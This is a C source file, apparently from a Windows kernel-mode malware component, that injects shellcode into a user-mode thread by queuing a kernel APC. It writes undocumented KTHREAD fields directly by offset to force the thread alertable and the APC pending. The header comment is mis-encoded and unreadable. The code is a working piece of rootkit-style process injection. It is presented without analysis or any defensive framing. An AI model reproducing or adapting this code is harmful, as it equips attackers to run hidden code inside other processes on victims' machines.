/**	����� ������������ ����� ����� ���������� ��������� ����������� ������������� ��� ����� ����������:
	* PAGE_SIZE_CONST - ������ �������� ������.
	* DW_ALERTABLE_CONST - ��������-��������� �������� KTHREAD.dwAlertable.
	* DW_APC_QUEUEABLE_CONST - ��������-��������� �������� KTHREAD.ApcState.
	* DW_ALERTABLE_CONST - ��������-��������� ����� ��� ��������� Alertable � ������.
	* APC_KERNLE_ROUTINE - ����� �������, �������������� APC � kernel-mode.
*/

#include "shellcode.h"

typedef enum _KAPC_ENVIRONMENT {
	OriginalApcEnvironment,
	AttachedApcEnvironment,
	CurrentApcEnvironment
} KAPC_ENVIRONMENT;


VOID apc_kernel_routine(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, void** NormalContext, void** SystemArgument1, void** SystemArgument2)
{
	NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
	USE_GLOBAL_BLOCK

#ifdef _WIN64
	ntStatus = pGlobalBlock->pCommonBlock->fnPsWrapApcWow64Thread(NormalContext,(void**)NormalRoutine);
#endif

	if (Apc) {
		EX_FREE_POOL_WITH_TAG(Apc, ALLOCATOR_TAG);
	}
}

bool_t install_user_mode_apc(PETHREAD eThread, uint8_t* pSc, uint8_t* pScData)
{
    PKAPC pApc = NULL;
    LARGE_INTEGER delay;
    NTSTATUS ntStatus;
    bool_t result = FALSE;
    USE_GLOBAL_BLOCK;

    do {
        pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pApc, sizeof(KAPC), NonPagedPool);

	    pGlobalBlock->pCommonBlock->fnKeInitializeApc(pApc, (PKTHREAD)eThread, OriginalApcEnvironment, pGlobalBlock->pLauncherBlock->fnapc_kernel_routine, NULL, (PKNORMAL_ROUTINE)pSc, UserMode, pScData);

        ((KAPC_STATE*)((uint8_t*)eThread + pGlobalBlock->pLauncherBlock->dwApcQueueable))->UserApcPending = 1;

        *((uint8_t*)eThread + pGlobalBlock->pLauncherBlock->dwAlertable) |= pGlobalBlock->pLauncherBlock->dbAlertableMask;

        if (!pGlobalBlock->pCommonBlock->fnKeInsertQueueApc(pApc, NULL, NULL, 0)) {
            break;
        }

        result = TRUE;
    } while (0);

	if (!result) {
        if (pApc != NULL) {
			pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pApc, ALLOCATOR_TAG);
        }
	}

	return result;
}
